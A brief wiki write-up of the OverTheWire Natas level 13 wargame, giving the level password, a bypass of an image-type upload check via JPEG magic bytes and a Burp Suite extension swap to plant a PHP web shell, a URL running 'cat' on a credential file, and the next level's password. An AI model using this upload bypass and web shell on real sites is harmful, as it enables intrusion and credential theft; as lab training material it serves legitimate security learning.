[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")

Username: natas13 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY URL:
<http://natas13.natas.labs.overthewire.org>

the php code uses the exif_image type so we just have to add
FF-D8-FF-E0 to the beginning. this is a magic number for files to check
if it contains an image then we do the burpsuite trick to replace the
jpg to php.

<http://natas13.natas.labs.overthewire.org/upload/rwofu4lfmz.php?cmd=cat%20/etc/natas_webpass/natas14>
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1